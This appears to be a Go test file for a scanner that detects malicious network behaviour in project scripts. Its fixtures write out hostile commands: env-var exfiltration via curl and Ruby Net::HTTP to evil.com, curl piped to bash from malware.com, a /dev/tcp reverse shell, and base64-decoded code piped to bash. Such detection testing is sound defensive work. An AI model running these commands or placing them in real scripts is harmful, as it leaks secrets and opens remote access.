package scanner

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestShellScript_CurlExfiltration(t *testing.T) {
	sna := NewStaticNetworkAnalyzer("/tmp/test")
	content := `#!/bin/bash
# Steal env vars
STOLEN=$(printenv | base64)
curl -X POST -d "$STOLEN" https://evil.com/collect
`
	tmpDir := t.TempDir()
	scriptFile := filepath.Join(tmpDir, "setup.sh")
	os.WriteFile(scriptFile, []byte(content), 0755)

	sna2 := NewStaticNetworkAnalyzer(tmpDir)
	threats, err := sna2.AnalyzeProject([]string{scriptFile})
	if err != nil {
		t.Fatalf("AnalyzeProject failed: %v", err)
	}
	_ = sna

	if len(threats) == 0 {
		t.Fatal("Shell script with curl POST + printenv should be detected")
	}

	found := false
	for _, th := range threats {
		for _, ev := range th.Evidence {
			if strings.Contains(fmt.Sprintf("%v", ev.Value),"curl") || strings.Contains(fmt.Sprintf("%v", ev.Value),"Shell script") {
				found = true
			}
		}
	}
	if !found {
		t.Error("Should specifically identify shell curl exfiltration pattern")
	}
}

func TestShellScript_PipeToBash(t *testing.T) {
	tmpDir := t.TempDir()
	content := `#!/bin/bash
curl -sSL https://malware.com/payload.sh | bash
`
	scriptFile := filepath.Join(tmpDir, "install.sh")
	os.WriteFile(scriptFile, []byte(content), 0755)

	sna := NewStaticNetworkAnalyzer(tmpDir)
	threats, err := sna.AnalyzeProject([]string{scriptFile})
	if err != nil {
		t.Fatalf("AnalyzeProject failed: %v", err)
	}
	if len(threats) == 0 {
		t.Fatal("curl | bash should be detected as a threat")
	}

	foundPipe := false
	for _, th := range threats {
		for _, ev := range th.Evidence {
			if strings.Contains(fmt.Sprintf("%v", ev.Value),"pipes download") || strings.Contains(fmt.Sprintf("%v", ev.Value),"curl") {
				foundPipe = true
			}
		}
	}
	if !foundPipe {
		t.Error("Should identify curl pipe to shell pattern")
	}
}

func TestShellScript_ReverseShell(t *testing.T) {
	tmpDir := t.TempDir()
	content := `#!/bin/bash
bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
`
	scriptFile := filepath.Join(tmpDir, "postinstall.sh")
	os.WriteFile(scriptFile, []byte(content), 0755)

	sna := NewStaticNetworkAnalyzer(tmpDir)
	threats, err := sna.AnalyzeProject([]string{scriptFile})
	if err != nil {
		t.Fatalf("AnalyzeProject failed: %v", err)
	}
	if len(threats) == 0 {
		t.Fatal("/dev/tcp reverse shell should be detected")
	}
}

func TestShellScript_Base64Decode(t *testing.T) {
	tmpDir := t.TempDir()
	content := `#!/bin/bash
echo "bWFsaWNpb3VzX2NvZGU=" | base64 -d | bash
`
	scriptFile := filepath.Join(tmpDir, "run.sh")
	os.WriteFile(scriptFile, []byte(content), 0755)

	sna := NewStaticNetworkAnalyzer(tmpDir)
	threats, err := sna.AnalyzeProject([]string{scriptFile})
	if err != nil {
		t.Fatalf("AnalyzeProject failed: %v", err)
	}
	if len(threats) == 0 {
		t.Fatal("base64 decode piped to bash should be detected")
	}
}

func TestShellScript_SafeScript_NoFalsePositive(t *testing.T) {
	tmpDir := t.TempDir()
	content := `#!/bin/bash
# Normal build script
set -e
npm install
npm run build
npm test
echo "Build completed successfully"
`
	scriptFile := filepath.Join(tmpDir, "build.sh")
	os.WriteFile(scriptFile, []byte(content), 0755)

	sna := NewStaticNetworkAnalyzer(tmpDir)
	threats, err := sna.AnalyzeProject([]string{scriptFile})
	if err != nil {
		t.Fatalf("AnalyzeProject failed: %v", err)
	}
	if len(threats) > 0 {
		t.Errorf("Safe build script should not trigger threats; got %d: %s", len(threats), threats[0].Description)
	}
}

func TestRubyScript_NetHTTPExfil(t *testing.T) {
	tmpDir := t.TempDir()
	content := `require 'net/http'
require 'json'

uri = URI('https://evil.com/collect')
data = { env: ENV.to_h }
Net::HTTP.post(uri, data.to_json)
`
	scriptFile := filepath.Join(tmpDir, "malicious.rb")
	os.WriteFile(scriptFile, []byte(content), 0644)

	sna := NewStaticNetworkAnalyzer(tmpDir)
	threats, err := sna.AnalyzeProject([]string{scriptFile})
	if err != nil {
		t.Fatalf("AnalyzeProject failed: %v", err)
	}
	if len(threats) == 0 {
		t.Fatal("Ruby Net::HTTP.post with ENV access should be detected")
	}
}

func TestStaticAnalyzer_ShExtensionsSupported(t *testing.T) {
	tmpDir := t.TempDir()

	// Create files with various extensions
	extensions := []string{".sh", ".bash", ".mjs", ".cjs", ".rb", ".go"}
	for _, ext := range extensions {
		content := `# safe file`
		os.WriteFile(filepath.Join(tmpDir, "test"+ext), []byte(content), 0644)
	}

	// Create an unsupported extension
	os.WriteFile(filepath.Join(tmpDir, "test.txt"), []byte("curl evil.com"), 0644)

	sna := NewStaticNetworkAnalyzer(tmpDir)
	// This just verifies no panic and that the analyzer processes the files
	_, err := sna.ScanDirectory(tmpDir)
	if err != nil {
		t.Fatalf("ScanDirectory failed: %v", err)
	}
}
